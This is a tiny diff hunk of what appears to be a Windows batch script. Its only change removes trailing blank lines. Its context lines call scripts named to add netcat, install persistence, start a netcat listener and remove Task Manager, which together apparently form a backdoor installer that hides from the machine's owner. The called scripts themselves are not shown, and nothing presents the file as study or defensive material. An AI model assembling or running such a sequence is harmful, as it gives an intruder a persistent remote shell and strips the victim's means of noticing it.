@@ -13,5 +13,3 @@ call addnetcat.bat
 call PersistenceScript.bat
 call netcatlistener.bat
 call removeTaskManager.bat
-
-
